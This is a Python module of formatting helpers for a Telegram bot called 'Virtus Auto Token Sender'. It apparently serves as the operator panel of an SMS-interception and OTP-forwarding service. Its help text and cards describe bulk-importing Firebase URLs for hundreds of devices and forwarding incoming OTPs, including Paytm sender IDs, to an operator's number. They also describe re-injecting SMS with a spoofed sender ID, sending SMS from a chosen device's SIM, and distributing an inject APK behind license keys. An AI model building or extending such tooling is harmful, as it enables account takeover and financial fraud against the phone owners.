import json
from datetime import datetime, timezone

from telegram import InlineKeyboardButton, InlineKeyboardMarkup

from app.database import Device, MonitorProfile

STARTUP_TEST_SENDER = "ASTIK"
STARTUP_TEST_MESSAGE = "hello baby aau kya?"
BRAND_NAME = "Virtus Auto Token Sender"


def format_apk_download_card(download_url: str) -> str:
    link = download_url.strip()
    return (
        "📥 <b>Virtus SMS Module APK</b>\n\n"
        "👇 <b>iOS / iPhone:</b> neeche <b>Download APK</b> button dabao\n"
        "Phir Android phone par transfer karke install karo\n\n"
        f'🔗 <a href="{link}">Tap here — Download Virtus APK</a>\n\n'
        "<pre>"
        "Android (rooted mynum phone):\n"
        "1. APK install\n"
        "2. Bot wala KEY daalo (Firebase auto-pull)\n"
        "3. START SERVICE ON\n"
        "4. TEST INJECTION\n"
        "5. Bot /startmonitor"
        "</pre>"
    )


def format_addchannel_card(channel_id: str, sim_slot: int = 1) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"📢 Channel: {channel_id}\n"
        f"📶 SIM: {sim_slot}"
        "</pre>"
    )


def format_firebase_connected_card(
    firebase_url: str,
    online_count: int,
    total: int = 0,
    device_ids: list[str] | None = None,
) -> str:
    ids_block = ""
    if device_ids:
        preview = device_ids[:8]
        ids_block = "\n\n" + "\n".join(f"• {device_id}" for device_id in preview)
        if len(device_ids) > 8:
            ids_block += f"\n... +{len(device_ids) - 8} more"
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Firebase Connected!\n\n"
        f"URL: {firebase_url}\n"
        f"📱 Online Devices Found: {online_count}\n"
        "Next Step: /setdevice"
        f"{ids_block}"
        "</pre>"
    )


def format_premium_gate_card(user_id: int) -> str:
    return (
        "🔒 <b>PREMIUM ACCESS REQUIRED</b>\n\n"
        "<pre>"
        "&gt; You must be approved to use this bot.\n\n"
        f"👤 Your ID: {user_id}"
        "</pre>"
    )


def format_access_approved_card() -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Your premium access has been APPROVED by the Admin!"
        "</pre>"
    )


def short_device_id(name: str) -> str:
    return name[:8] if len(name) > 8 else name


def get_device_meta(device: Device) -> dict:
    if not hasattr(device, "device_meta") or not device.device_meta:
        return {}
    try:
        return json.loads(device.device_meta)
    except (json.JSONDecodeError, TypeError):
        return {}


def _is_valid_sim_number(number: str | None) -> bool:
    if not number:
        return False
    normalized = str(number).strip().upper()
    return normalized not in {"N/A", "UNKNOWN", "NA", "-", "NONE", ""}


def _normalize_sim_slots(sims: list[dict]) -> list[dict]:
    valid = [sim for sim in sims if isinstance(sim, dict) and _is_valid_sim_number(sim.get("number"))]
    source = valid if valid else [sim for sim in sims if isinstance(sim, dict)]
    if not source:
        return []
    normalized: list[dict] = []
    for index, sim in enumerate(source):
        normalized.append(
            {
                "slot": index + 1,
                "index": index,
                "carrier": sim.get("carrier") or f"SIM {index + 1}",
                "number": sim.get("number") or "Unknown",
            }
        )
    return normalized


def get_sim_list(device: Device) -> list[dict]:
    meta = get_device_meta(device)
    sims = meta.get("sims")
    if isinstance(sims, list) and sims:
        cleaned = [sim for sim in sims if isinstance(sim, dict)]
        if cleaned:
            return _normalize_sim_slots(cleaned)

    primary = device.phone_number
    sim2 = meta.get("sim2") or meta.get("phone2")
    built: list[dict] = []
    if _is_valid_sim_number(primary):
        built.append({"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary})
    if _is_valid_sim_number(sim2):
        built.append(
            {
                "slot": len(built) + 1,
                "index": len(built),
                "carrier": "SIM 2",
                "number": sim2,
            }
        )
    if built:
        return built
    return [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary or "Unknown"}]


def get_display_sims(device: Device) -> list[dict]:
    """UI buttons — show both SIM slots when device reports dual SIM."""
    sims = get_sim_list(device)
    if len(sims) >= 2:
        return sims[:2]
    active = [sim for sim in sims if _is_valid_sim_number(sim.get("number"))]
    return active if active else sims[:1]


def get_active_sims(device: Device) -> list[dict]:
    sims = get_sim_list(device)
    active = [sim for sim in sims if _is_valid_sim_number(sim.get("number"))]
    if active:
        return active
    return sims[:1] if sims else [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}]


def get_selected_sim(device: Device, sim_index: int = 0) -> dict:
    sims = get_sim_list(device)
    if 0 <= sim_index < len(sims):
        return sims[sim_index]
    active = get_active_sims(device)
    return active[0] if active else {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}


def get_inject_key(profile: MonitorProfile | None, device: Device) -> str:
    from app.license_keys import is_valid_license_key_format, license_key_exists

    license_key = (profile.license_key or "").strip().upper() if profile else ""
    if is_valid_license_key_format(license_key) and license_key_exists(license_key):
        return license_key
    device_key = (device.api_key or "").strip().upper()
    if is_valid_license_key_format(device_key) and license_key_exists(device_key):
        return device_key
    return "—"


def get_battery(device: Device) -> str:
    meta = get_device_meta(device)
    battery = meta.get("battery") or meta.get("battery_level")
    if battery is None:
        return "N/A"
    text = str(battery).strip()
    if not text or text.lower() in {"unknown", "n/a", "na", "null", "none"}:
        return "N/A"
    return f"{text}%" if "%" not in text else text


def get_model_name(device: Device) -> str:
    meta = get_device_meta(device)
    return meta.get("model") or meta.get("device_model") or "Unknown"


def _format_sim_number(number: str) -> str:
    text = str(number or "Unknown").strip()
    if text.startswith("+") or len(text) > 12:
        return text
    return f"+{text}" if text.isdigit() else text


def _sim_button_label(sim: dict) -> str:
    slot = sim.get("slot", 1)
    carrier = sim.get("carrier") or f"SIM {slot}"
    number = _format_sim_number(sim.get("number") or "Unknown")
    label = f"📶 SIM {slot}: {carrier} ({number})"
    return label[:60] + "..." if len(label) > 63 else label


def _sim_lines_block(device: Device, *, numbered: bool = False) -> str:
    lines = []
    for sim in get_display_sims(device):
        slot = sim.get("slot", 1)
        carrier = sim.get("carrier") or f"SIM {slot}"
        number = sim.get("number") or "Unknown"
        if numbered:
            lines.append(f"SIM {slot}: {carrier} ({_format_sim_number(number)})")
        else:
            lines.append(f"📶 SIM {slot}: {carrier} ({number})")
    return "\n".join(lines) if lines else "📶 SIM: Unknown"


def format_device_set_card(
    device: Device,
    selected_sim: int = 0,
    *,
    status: str = "online",
) -> str:
    device_short = short_device_id(device.name)
    active = get_selected_sim(device, selected_sim)
    active_slot = active.get("slot", 1)
    active_index = active.get("index", 0)
    from_number = active.get("number") or device.phone_number or "Unknown"

    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Device Set!\n\n"
        f"📱 {device_short}\n"
        f"🔋 {get_battery(device)}\n"
        f"📶 Active SIM: SIM {active_slot} (Index {active_index})\n"
        f"📞 FROM Number: {from_number}\n"
        f"{_sim_lines_block(device, numbered=True)}\n\n"
        "Select SIM Slot for sending SMS:"
        "</pre>"
    )


def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
    sims = get_display_sims(device)
    rows = [
        [
            InlineKeyboardButton(
                _sim_button_label(sim),
                callback_data=f"sim:{device.id}:{sim['index']}",
            )
        ]
        for sim in sims
    ]
    return InlineKeyboardMarkup(rows)


def sim_monitoring_keyboard(device: Device) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "🟢 START Monitoring",
                    callback_data=f"monitor:start:{device.id}",
                ),
                InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
            ]
        ]
    )


def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
    active = get_selected_sim(device, sim_index)
    slot = active.get("slot", 1)
    number = active.get("number", "Unknown")
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"📱 {short_device_id(device.name)}\n"
        f"{_sim_lines_block(device)}\n"
        f"✅ FROM SIM {slot}: {number}\n"
        f"🔋 {get_battery(device)}"
        "</pre>"
    )


def format_timing_footer(queued_ms: int, total_ms: int) -> str:
    return f"⏱ queued {queued_ms}ms | total {total_ms}ms"


def format_inject_startup_card(
    sender: str,
    message: str,
    queued_ms: int = 3,
    total_ms: int = 15,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        "⚡ INJECT FORWARDED! [STARTUP]\n"
        f"📤 Sender: {sender}\n"
        f"🔐 {body}\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_outbound_stream_card(
    to_number: str,
    message: str,
    *,
    sim_slot: int = 1,
    source: str = "CHANNEL",
    queued_ms: int = 3,
    total_ms: int = 22,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 500:
        body = body[:500] + "..."
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        f"🎯 TOKEN FORWARDED! [{source.upper()}]\n"
        f"To: {to_number}\n"
        f"{body}\n"
        "📋 Format: Emoji\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_inject_stream_card(
    sender: str,
    message: str,
    queued_ms: int = 3,
    total_ms: int = 22,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 500:
        body = body[:500] + "..."
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        "⚡ INJECT FORWARDED! [STREAM]\n"
        f"📥 Sender: {sender}\n"
        f"🔐 {body}\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_mynum_set_card(phone: str) -> str:
    from app.services import display_phone

    shown = display_phone(phone)
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        "Forwarding Number Set!\n"
        f"📞 Target: {shown}\n"
        "Real SMS forwards go here during monitoring."
        "</pre>"
    )


def format_auto_stop_card(minutes: int = 15) -> str:
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        "Monitoring STOPPED!\n"
        "✅ No more SMS forward/inject."
        "</pre>"
    )


def format_stop_card() -> str:
    return format_auto_stop_card()


def format_monitoring_card(
    device: Device,
    profile: MonitorProfile,
    ignored_sms: int = 0,
    test_message: str | None = None,
) -> str:
    sim_index = profile.selected_sim_index or 0
    active_sim = get_selected_sim(device, sim_index)
    sim_slot = active_sim.get("slot", 1)
    sim_number = active_sim.get("number", "Unknown")
    from app.services import display_phone

    target = display_phone(profile.phone_number) if profile.phone_number else "Not set"
    auto_stop = profile.auto_stop_minutes or 15
    inject_key = get_inject_key(profile, device)
    test_msg = test_message or STARTUP_TEST_MESSAGE
    device_phone = _format_sim_number(device.phone_number or sim_number)

    channel = profile.channel_id or "—"
    sim_label = _format_sim_number(sim_number)
    return (
        "✅ <b>SUCCESS</b>\n"
        "<pre>"
        "Monitoring Started! &lt;/&gt;\n"
        f"📱 Device: {short_device_id(device.name)} | {device_phone}\n"
        f"📶 FROM SIM: {sim_slot} ({sim_label})\n"
        f"🔑 Inject Key: {inject_key}\n"
        "📥 Incoming -&gt; spoof inject (same sender ID)\n"
        f"📞 Real SMS -&gt; {target}\n"
        f"📢 Channel: {channel} (last / addchannel only)\n"
        f"⏱️ Auto-stop in {auto_stop} minutes\n"
        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
        f"✅ Test inject OK: {test_msg}"
        "</pre>"
    )


def monitoring_keyboard(device: Device | None = None) -> InlineKeyboardMarkup:
    start_data = f"monitor:start:{device.id}" if device else "monitor:on"
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("🟢 START Monitoring", callback_data=start_data),
                InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
            ]
        ]
    )


def format_commands_message() -> str:
    """User setup + controls — Astik /help style."""
    return (
        "✨ 📖 <b>User Setup</b>\n"
        "<pre>"
        "1. /setfirebase &lt;url&gt;   Connect your DB\n"
        "2. /setdevice            Pick device &amp; select SIM\n"
        "3. /mynum &lt;number&gt;      Your forwarding number\n"
        "4. /addchannel           Add group\n"
        "5. /startmonitor         Start monitoring"
        "</pre>\n\n"
        "✨ 🎮 <b>Controls</b>\n"
        "<pre>"
        "/stop       Pause monitor\n"
        "/resume     Resume monitor\n"
        "/status     View current stats\n"
        "/send &lt;num&gt; &lt;msg&gt;  Manual SMS\n"
        "/ping       Check latency"
        "</pre>"
    )


def format_welcome_message() -> str:
    """Astik-style /start welcome card."""
    return (
        f"──✦ <b>{BRAND_NAME}</b> ✦──\n\n"
        "✨ <b>Welcome to Premium Automation</b>\n"
        "<blockquote>Fast, secure, and reliable OTP forwarding directly to your Firebase connected devices.</blockquote>\n\n"
        "✨ 📖 <b>Injector Setup (Sender Spoof)</b>\n"
        "<pre>"
        "1. /key KEY-XXXX-XXXX-XXXX-XXXX\n"
        "   Your license key (like /mynum for inject)\n"
        "2. /fy &lt;device_id&gt; - Pick device to monitor\n"
        "   Pick SIM → /addchannel → /startmonitor\n"
        "   → Incoming SMS replayed with SAME sender ID via inject API"
        "</pre>\n\n"
        "✨ 📖 <b>Admin Setup (Firebase Panel)</b>\n"
        "<pre>"
        "1. /fb &lt;device_id&gt;     Find device &amp; select SIM\n"
        "2. /mynum &lt;number&gt;    Your forwarding number\n"
        "3. /addchannel           Add group for monitoring\n"
        "4. /startmonitor         Start auto-forwarding"
        "</pre>\n\n"
        "✨ 📖 <b>User Setup</b>\n"
        "<pre>"
        "1. /setfirebase &lt;url&gt;   Connect your DB\n"
        "2. /setdevice            Pick device &amp; select SIM\n"
        "3. /mynum &lt;number&gt;      Your forwarding number\n"
        "4. /addchannel           Add group\n"
        "5. /startmonitor         Start monitoring"
        "</pre>\n\n"
        "✨ 🎮 <b>Controls</b>\n"
        "<pre>"
        "/stop       Pause monitor\n"
        "/resume     Resume monitor\n"
        "/status     View current stats\n"
        "/send &lt;num&gt; &lt;msg&gt;  Manual SMS\n"
        "/ping       Check latency\n"
        "/apk        Download inject APK"
        "</pre>\n\n"
        "<pre>/help\n/guide\n/apk</pre>"
    )


def format_guide_message() -> str:
    """Explanations only — /guide command."""
    return (
        "📖 <b>GUIDE — Kaise kaam karta hai</b>\n\n"
        "<b>Setup flow</b>\n"
        "<pre>"
        "1. /setfirebase → Firebase connect\n"
        "2. /fdy /fy /fb → device find (bina key)\n"
        "   /a → device find (KEY inject ke liye)\n"
        "3. SIM button → asli number dikhega\n"
        "4. /mynum → incoming OTP inject target\n"
        "5. /addchannel → group set\n"
        "6. /startmonitor → Monitoring ON"
        "</pre>\n\n"
        "<b>/mynum</b>\n"
        "<pre>"
        "Sirf incoming OTP inject ke liye\n"
        "Same sender ID (AX-PAYTM, VK-PAYTM)\n"
        "SIM select se alag hai"
        "</pre>\n\n"
        "<b>Channel SMS</b>\n"
        "<pre>"
        "+91XXXXXXXXXX message\n"
        "91XXXXXXXXXX message\n"
        "XXXXXXXXXX message\n"
        "→ Device se real SMS (selected SIM)"
        "</pre>\n\n"
        "<b>KEY</b>\n"
        "<pre>"
        "/key generate → admin only\n"
        "/key KEY-XXXX → key set\n"
        "Unlimited devices per KEY\n"
        "APK + bot same KEY → /startmonitor"
        "</pre>\n\n"
        "<b>/allfirebase</b>\n"
        "<pre>"
        ".txt file bulk import (1600+)\n"
        "Firebase URLs ek saath add"
        "</pre>\n\n"
        "<b>Monitoring</b>\n"
        "<pre>"
        "ON message pin hoti hai\n"
        f"Test: {STARTUP_TEST_MESSAGE}\n"
        "Auto-stop: 15 min default"
        "</pre>\n\n"
        "<b>Stop</b>\n"
        "<pre>"
        "/stop — monitoring off\n"
        "Auto-stop: 15 min default"
        "</pre>"
    )


def format_status_card(
    device: Device | None,
    profile: MonitorProfile | None,
) -> str:
    if not profile:
        return "❌ <code>/setfirebase &lt;url&gt;</code>"

    device_name = device.name if device else "Not set"
    inject_key = get_inject_key(profile, device) if device else (profile.license_key or "—")
    automation = "🟢 Running" if profile.is_monitoring else "🔴 Stopped"

    return (
        f"📊 <b>{BRAND_NAME}</b>\n\n"
        "<pre>"
        f"📱 Device: {device_name}\n"
        f"🔑 KEY: {inject_key}\n"
        f"📞 /mynum: {profile.phone_number or '—'}\n"
        f"📢 Channel: {profile.channel_id or '—'}\n"
        f"⚡ Monitor: {automation}"
        "</pre>"
    )


def format_ping_card(latency_ms: int) -> str:
    return (
        "✅ <b>PONG</b>\n\n"
        "<pre>"
        f"🏓 {latency_ms}ms"
        "</pre>"
    )


def format_key_error_card() -> str:
    return (
        "❌ <b>ERROR</b>\n\n"
        "<pre>"
        "Usage: '/key KEY-XXXX-XXXX-XXXX'\n"
        "Example: '/key KEY-BF0U-2LBM-5W6W'\n\n"
        "This is your inject target (like /mynum for spoof SMS)."
        "</pre>"
    )


def format_key_generated_card(license_key: str) -> str:
    return (
        "✅ <b>KEY GENERATED</b>\n\n"
        f"<pre>🔑 {license_key}</pre>"
    )


def format_key_set_card(inject_key: str) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "License Key Set!\n\n"
        f"🔑 {inject_key}\n\n"
        "Next: '/fy &lt;device_id&gt;' → pick SIM → '/addchannel' → '/startmonitor'\n"
        "Incoming SMS will inject with SAME sender ID."
        "</pre>"
    )


def format_send_queued(to_number: str, message: str, sim_slot: int) -> str:
    return (
        "✅ <b>SMS Queued</b>\n\n"
        "<pre>"
        f"📶 SIM: {sim_slot}\n"
        f"📞 To: {to_number}\n"
        f"💬 {message[:200]}"
        "</pre>"
    )


def update_device_meta(device: Device, data: dict) -> dict:
    meta = get_device_meta(device)
    meta.update(data)
    return meta
